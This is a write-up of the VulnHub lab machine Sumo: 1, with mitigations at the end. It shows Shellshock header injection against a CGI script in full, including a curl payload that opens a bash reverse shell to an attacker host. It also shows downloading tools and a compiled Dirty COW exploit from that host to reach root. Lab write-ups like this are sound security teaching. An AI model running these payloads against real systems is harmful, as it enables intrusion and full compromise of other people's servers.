# Sumo: 1 — Walkthrough

| Field | Detail |
|---|---|
| Machine | Sumo: 1 |
| Platform | VulnHub |
| Web Server | Apache + CGI-Bin |
| OS | Ubuntu 12.04 |

## 🔍 Overview

Sumo: 1 is a Linux machine involving exploitation of the **Shellshock vulnerability (CVE-2014-6271)** via a CGI script to gain a `www-data` shell, followed by privilege escalation using the **Dirty COW kernel exploit (CVE-2016-5195)** on an outdated kernel.

---

## Step 1 – Reconnaissance

**Port and service scanning:**

```bash
nmap -v -p 80 -sT -sV -A 192.168.1.104
```

**Result:** Apache httpd 2.2.22 (Ubuntu) — an older version commonly associated with exposed CGI scripts.

**Directory/script enumeration:**

```bash
nmap -v -p 80 --script=http-enum 192.168.1.104
```

**Found:** A `/cgi-bin/` directory serving server-side scripts.

**Web vulnerability scan:**

```bash
nikto -C all -h http://192.168.1.104/
```

**Found:** A specific CGI script (`/cgi-bin/test/test.cgi`) as a candidate target.

---

## Step 2 – Understanding Shellshock

Bash versions affected by CVE-2014-6271 incorrectly execute commands appended after a function definition in an environment variable:

```bash
() { :; }; COMMAND
```

When a web server passes HTTP headers (like `User-Agent`) into environment variables for a Bash-executed CGI script, this malformed syntax causes Bash to execute the injected `COMMAND`.

---

## Step 3 – Manual Shellshock Verification

**Baseline request** confirmed the CGI script executed normally and returned expected output.

**Exploit attempt via the `User-Agent` header:**

```bash
curl -H "User-Agent: () { :; }; /bin/ping <attacker-ip> -c 3" \
http://192.168.1.104/cgi-bin/test/test.cgi
```

**Verification:** Monitored the attacker machine with `tcpdump -n -i eth0 icmp` and confirmed ICMP packets were received — proving remote command execution.

---

## Step 4 – Automated Detection (Nmap NSE)

```bash
nmap -p 80 --script http-shellshock \
--script-args http-shellshock.uri=/cgi-bin/test/test.cgi \
192.168.1.104
```

Also used the NSE script's `http-shellshock.cmd` argument to execute arbitrary commands remotely for further confirmation.

---

## Step 5 – Command Execution & Enumeration

```bash
curl -H "User-Agent: () { :; }; echo; /usr/bin/id" \
http://192.168.1.104/cgi-bin/test/test.cgi
```

Also enumerated available binaries on the target (`wget`, `curl`, `nc`, `python`, `perl`) to plan file transfer and shell delivery methods.

---

## Step 6 – Reverse Shell Exploitation

**Set up a listener:**

```bash
nc -lvnp 443
```

**Triggered a Bash reverse shell via the Shellshock payload:**

```bash
curl -A "() { :; }; echo; /bin/bash -i >& /dev/tcp/<attacker-ip>/443 0>&1" \
http://192.168.1.104/cgi-bin/test/test.cgi
```

**Result:** Reverse shell received as `www-data`.

---

## Step 7 – Upgrade to a Fully Interactive Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Stabilized the terminal using the standard `CTRL+Z` → `stty raw -echo; fg` → `reset` sequence, then set:

```bash
export TERM=xterm
stty rows 40 columns 120
```

---

## Step 8 – Privilege Escalation Enumeration

```bash
wget http://<attacker-ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Found:** Ubuntu 12.04 running kernel 3.2.0-23 — vulnerable to **CVE-2016-5195 (Dirty COW)**.

---

## Step 9 – Dirty COW Privilege Escalation

**Obtained and compiled the exploit (on Kali):**

```bash
searchsploit dirty cow
cp /usr/share/exploitdb/exploits/linux/local/40839.c .
cc -pthread 40839.c -o dirty -lcrypt
```

**Transferred the compiled exploit to the target:**

```bash
python3 -m http.server 80
# on target:
cd /tmp
wget http://<attacker-ip>/dirty
chmod +x dirty
```

**Executed the exploit** (which sets a new password for a root-equivalent user, `firefart`, by patching `/etc/passwd` in memory):

```bash
./dirty
```

**Escalated to root:**

```bash
su firefart
id
```

**Result:** `uid=0(root)` — root access achieved.

**Restored the system afterward** (important, since Dirty COW modifies `/etc/passwd`):

```bash
mv /tmp/passwd.bak /etc/passwd
```

---

## Step 10 – Flag Capture

```bash
cd /root
ls
cat root.txt
```

✅ **Root flag captured — machine fully compromised.**

---

## 🛡️ Key Vulnerabilities Identified

1. Outdated Bash version vulnerable to Shellshock (CVE-2014-6271), exploitable via CGI script header injection
2. CGI scripts executed with Bash, exposing the server to environment-variable-based command injection
3. Severely outdated kernel (Ubuntu 12.04, kernel 3.2.0-23) vulnerable to the Dirty COW race condition (CVE-2016-5195)

## 🩹 Mitigations

1. Patch Bash immediately against Shellshock — this is a well-known, critical, and long-patched CVE
2. Avoid executing CGI scripts with Bash where possible; prefer safer scripting environments
3. Keep the OS kernel updated to protect against known local privilege escalation exploits like Dirty COW
4. Regularly run vulnerability scanners (Nikto, Nmap NSE) against exposed web services
5. Apply defense-in-depth: even if RCE is achieved, an up-to-date kernel would have blocked the privilege escalation path

---

## 🧰 Tools Used

`nmap` · `nikto` · `curl` · `tcpdump` · `netcat` · `python (pty)` · `LinPEAS` · Dirty COW exploit (CVE-2016-5195)

## 🧠 Techniques Covered

Network & CGI enumeration · Shellshock (CVE-2014-6271) exploitation · Manual and automated (Nmap NSE) vulnerability verification · Reverse shell handling · TTY stabilization · Automated privilege escalation enumeration (LinPEAS) · Dirty COW kernel exploit

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Reconnaissance | ✅ |
| 2 | Understanding Shellshock | ✅ |
| 3 | Manual Shellshock Verification | ✅ |
| 4 | Automated Detection (Nmap NSE) | ✅ |
| 5 | Command Execution & Enumeration | ✅ |
| 6 | Reverse Shell Exploitation | ✅ |
| 7 | Upgrade to Interactive Shell | ✅ |
| 8 | Privilege Escalation Enumeration | ✅ |
| 9 | Dirty COW Privilege Escalation | ✅ |
| 10 | Flag Capture | ✅ |

*Writeup for educational purposes. Machine solved as part of VulnHub CTF practice.*
